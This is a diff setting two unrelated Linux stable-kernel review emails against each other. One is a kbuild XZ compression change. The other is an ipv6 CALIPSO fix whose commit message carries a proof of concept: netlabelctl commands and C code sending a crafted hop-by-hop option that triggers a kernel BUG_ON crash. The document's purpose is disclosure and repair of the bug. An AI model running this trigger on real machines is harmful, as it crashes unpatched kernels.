@@ -1,54 +1,55 @@
-Return-Path: <stable+bounces-209372-lists+stable=lfdr.de@vger.kernel.org>
+Return-Path: <stable+bounces-209760-lists+stable=lfdr.de@vger.kernel.org>
 X-Original-To: lists+stable@lfdr.de
 Delivered-To: lists+stable@lfdr.de
-Received: from sto.lore.kernel.org (sto.lore.kernel.org [172.232.135.74])
-	by mail.lfdr.de (Postfix) with ESMTPS id 75C3DD26B12
-	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 18:45:27 +0100 (CET)
+Received: from tor.lore.kernel.org (tor.lore.kernel.org [IPv6:2600:3c04:e001:36c::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id 06E50D274D7
+	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 19:17:28 +0100 (CET)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sto.lore.kernel.org (Postfix) with ESMTP id 9280F30AC1CE
-	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 17:36:37 +0000 (UTC)
+	by tor.lore.kernel.org (Postfix) with ESMTP id 3B318305FDDC
+	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 18:02:25 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 6BC8B3BF2FE;
-	Thu, 15 Jan 2026 17:35:08 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 6CBEB3C0098;
+	Thu, 15 Jan 2026 17:53:34 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="U0wPrYzl"
+	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="OfF21Zg0"
 X-Original-To: stable@vger.kernel.org
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2F1382D94A7;
-	Thu, 15 Jan 2026 17:35:07 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2DD273D1CA0;
+	Thu, 15 Jan 2026 17:53:33 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1768498508; cv=none; b=t0g4z8d9iihK3gCYX/V1DBIu38CzVCCjE0BVaEY9nBXwhhFydpqlwcrgLCKl2MHIWTLP/vuaC5kEfqb0G+WBItAA2oVUDblJ8cCc0JnVWs1ekoI9YhnrXbvmTg9q9r5zPNqBfLN3vTttCiNCM42HLfmoqDaVciBIM5HL/TdGhlA=
+	t=1768499614; cv=none; b=o02jxH0yLwhQmnNX3DOLYs9wLXXlQzrWlq9VFNirGPWY+23cp4x5jHzgoAKr1mzvcjrFqfJRsPWk/43pv5TlocSluvPM/r0MOgtSwO4+gZHeQk/czPa2bmBI93kLoD/Y9vXEbH2VN/Wo+rthf8ghQZYyjcbOYipEsP1NmscqyGs=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1768498508; c=relaxed/simple;
-	bh=KuDbvPaLfTOzB6wywV6pGVV31EmlstCtOHy7wJKIM1U=;
+	s=arc-20240116; t=1768499614; c=relaxed/simple;
+	bh=wVgN/TUiZr17CLRUvNvFsrzlytdZWsQqlGP231+57n8=;
 	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=pIxKf63K7FYWD5FKxjLRPfytg0RhDUef6iYpLBdP7D1LqqYl1mAyUtnwp2HV3+QuDz9+8MU336EEEcz38PKQyIMAR1nzh2YIM4T4ToUTJzJVtATxfJxsLFn2mzHv8LTBZONLJsT3CYoRoGcRfAo8V1KyPaq7L9/gslrykSjJvzc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=U0wPrYzl; arc=none smtp.client-ip=10.30.226.201
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 7193AC116D0;
-	Thu, 15 Jan 2026 17:35:07 +0000 (UTC)
+	 MIME-Version; b=jriSbAq+GGcuZHEr7AFs396vHwROC/L8SxZOt9DoTjoxRUxkq4Pz120DLHjpyS87/yLpnk+BOzWhVAcbchmfGkhFJzJ4VxtlhdqVjB0ItKxsghyBXv0fSJTJvj9AMjoHVtWI3XwgvXRekEBu4TXCWoiVgbowA4/1PB4b8zUPdHQ=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=OfF21Zg0; arc=none smtp.client-ip=10.30.226.201
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 6B4A9C116D0;
+	Thu, 15 Jan 2026 17:53:33 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1768498507;
-	bh=KuDbvPaLfTOzB6wywV6pGVV31EmlstCtOHy7wJKIM1U=;
+	s=korg; t=1768499613;
+	bh=wVgN/TUiZr17CLRUvNvFsrzlytdZWsQqlGP231+57n8=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=U0wPrYzl+UkadKgz60sERT+kXywVEtjhlsxwhbCpnOLNPLsgjUj8KXAuHh5l7vYgQ
-	 gMcJnteHcmf4Cx3IAz83mzuL7DgnslnhIOWCp97NZPo6quSs6POYZn3fSEXbBovNE/
-	 v6avQ7+ej70+Bkr91RQToiPa4bG4Evbz7ELO6krA=
+	b=OfF21Zg0MR7Ha+CbvjoYm1kHZ7Od7Ev3iz9HFBD+vp50pUP+2Xtw9A8sLJlGOWhDX
+	 eQ0WqvT+CNfxESTWekULOHIavrJiHap4QktV4tP0LRPHLw1ZIPQVvHzWy8fulx5yJ2
+	 zWH7iSw/m5+8uqz9DbcgjknXu1STERRwXGAlbeiY=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Martin Nybo Andersen <tweek@tweek.dk>,
-	Masahiro Yamada <masahiroy@kernel.org>,
-	Christoph Biedl <linux-kernel.bfrz@manchmal.in-ulm.de>
-Subject: [PATCH 5.15 423/554] kbuild: Use CRC32 and a 1MiB dictionary for XZ compressed modules
+	Paul Moore <paul@paul-moore.com>,
+	Will Rosenberg <whrosenb@asu.edu>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Sasha Levin <sashal@kernel.org>
+Subject: [PATCH 5.10 288/451] ipv6: BUG() in pskb_expand_head() as part of calipso_skbuff_setattr()
 Date: Thu, 15 Jan 2026 17:48:09 +0100
-Message-ID: <20260115164301.569611828@linuxfoundation.org>
+Message-ID: <20260115164241.301432313@linuxfoundation.org>
 X-Mailer: git-send-email 2.52.0
-In-Reply-To: <20260115164246.225995385@linuxfoundation.org>
-References: <20260115164246.225995385@linuxfoundation.org>
+In-Reply-To: <20260115164230.864985076@linuxfoundation.org>
+References: <20260115164230.864985076@linuxfoundation.org>
 User-Agent: quilt/0.69
 X-stable: review
 X-Patchwork-Hint: ignore
@@ -60,44 +61,102 @@ List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-5.15-stable review patch.  If anyone has any objections, please let me know.
+5.10-stable review patch.  If anyone has any objections, please let me know.
 
 ------------------
 
-From: Martin Nybo Andersen <tweek@tweek.dk>
+From: Will Rosenberg <whrosenb@asu.edu>
 
-commit fbf5892df21a8ccfcb2fda0fd65bc3169c89ed28 upstream.
+[ Upstream commit 58fc7342b529803d3c221101102fe913df7adb83 ]
 
-Kmod is now (since kmod commit 09c9f8c5df04 ("libkmod: Use kernel
-decompression when available")) using the kernel decompressor, when
-loading compressed modules.
+There exists a kernel oops caused by a BUG_ON(nhead < 0) at
+net/core/skbuff.c:2232 in pskb_expand_head().
+This bug is triggered as part of the calipso_skbuff_setattr()
+routine when skb_cow() is passed headroom > INT_MAX
+(i.e. (int)(skb_headroom(skb) + len_delta) < 0).
 
-However, the kernel XZ decompressor is XZ Embedded, which doesn't
-handle CRC64 and dictionaries larger than 1MiB.
+The root cause of the bug is due to an implicit integer cast in
+__skb_cow(). The check (headroom > skb_headroom(skb)) is meant to ensure
+that delta = headroom - skb_headroom(skb) is never negative, otherwise
+we will trigger a BUG_ON in pskb_expand_head(). However, if
+headroom > INT_MAX and delta <= -NET_SKB_PAD, the check passes, delta
+becomes negative, and pskb_expand_head() is passed a negative value for
+nhead.
 
-Use CRC32 and 1MiB dictionary when XZ compressing and installing
-kernel modules.
+Fix the trigger condition in calipso_skbuff_setattr(). Avoid passing
+"negative" headroom sizes to skb_cow() within calipso_skbuff_setattr()
+by only using skb_cow() to grow headroom.
 
-Link: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1050582
-Signed-off-by: Martin Nybo Andersen <tweek@tweek.dk>
-Signed-off-by: Masahiro Yamada <masahiroy@kernel.org>
-Cc: Christoph Biedl <linux-kernel.bfrz@manchmal.in-ulm.de>
-Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
+PoC:
+	Using `netlabelctl` tool:
+
+        netlabelctl map del default
+        netlabelctl calipso add pass doi:7
+        netlabelctl map add default address:0::1/128 protocol:calipso,7
+
+        Then run the following PoC:
+
+        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+
+        // setup msghdr
+        int cmsg_size = 2;
+        int cmsg_len = 0x60;
+        struct msghdr msg;
+        struct sockaddr_in6 dest_addr;
+        struct cmsghdr * cmsg = (struct cmsghdr *) calloc(1,
+                        sizeof(struct cmsghdr) + cmsg_len);
+        msg.msg_name = &dest_addr;
+        msg.msg_namelen = sizeof(dest_addr);
+        msg.msg_iov = NULL;
+        msg.msg_iovlen = 0;
+        msg.msg_control = cmsg;
+        msg.msg_controllen = cmsg_len;
+        msg.msg_flags = 0;
+
+        // setup sockaddr
+        dest_addr.sin6_family = AF_INET6;
+        dest_addr.sin6_port = htons(31337);
+        dest_addr.sin6_flowinfo = htonl(31337);
+        dest_addr.sin6_addr = in6addr_loopback;
+        dest_addr.sin6_scope_id = 31337;
+
+        // setup cmsghdr
+        cmsg->cmsg_len = cmsg_len;
+        cmsg->cmsg_level = IPPROTO_IPV6;
+        cmsg->cmsg_type = IPV6_HOPOPTS;
+        char * hop_hdr = (char *)cmsg + sizeof(struct cmsghdr);
+        hop_hdr[1] = 0x9; //set hop size - (0x9 + 1) * 8 = 80
+
+        sendmsg(fd, &msg, 0);
+
+Fixes: 2917f57b6bc1 ("calipso: Allow the lsm to label the skbuff directly.")
+Suggested-by: Paul Moore <paul@paul-moore.com>
+Signed-off-by: Will Rosenberg <whrosenb@asu.edu>
+Acked-by: Paul Moore <paul@paul-moore.com>
+Link: https://patch.msgid.link/20251219173637.797418-1-whrosenb@asu.edu
+Signed-off-by: Paolo Abeni <pabeni@redhat.com>
+Signed-off-by: Sasha Levin <sashal@kernel.org>
 ---
- scripts/Makefile.modinst |    2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
+ net/ipv6/calipso.c | 3 ++-
+ 1 file changed, 2 insertions(+), 1 deletion(-)
 
---- a/scripts/Makefile.modinst
-+++ b/scripts/Makefile.modinst
-@@ -95,7 +95,7 @@ endif
- quiet_cmd_gzip = GZIP    $@
-       cmd_gzip = $(KGZIP) -n -f $<
- quiet_cmd_xz = XZ      $@
--      cmd_xz = $(XZ) --lzma2=dict=2MiB -f $<
-+      cmd_xz = $(XZ) --check=crc32 --lzma2=dict=1MiB -f $<
- quiet_cmd_zstd = ZSTD    $@
-       cmd_zstd = $(ZSTD) -T0 --rm -f -q $<
+diff --git a/net/ipv6/calipso.c b/net/ipv6/calipso.c
+index 59997e5d1343..c2e716601ed3 100644
+--- a/net/ipv6/calipso.c
++++ b/net/ipv6/calipso.c
+@@ -1345,7 +1345,8 @@ static int calipso_skbuff_setattr(struct sk_buff *skb,
+ 	/* At this point new_end aligns to 4n, so (new_end & 4) pads to 8n */
+ 	pad = ((new_end & 4) + (end & 7)) & 7;
+ 	len_delta = new_end - (int)end + pad;
+-	ret_val = skb_cow(skb, skb_headroom(skb) + len_delta);
++	ret_val = skb_cow(skb,
++			  skb_headroom(skb) + (len_delta > 0 ? len_delta : 0));
+ 	if (ret_val < 0)
+ 		return ret_val;
  
+-- 
+2.51.0
+
 
 
 
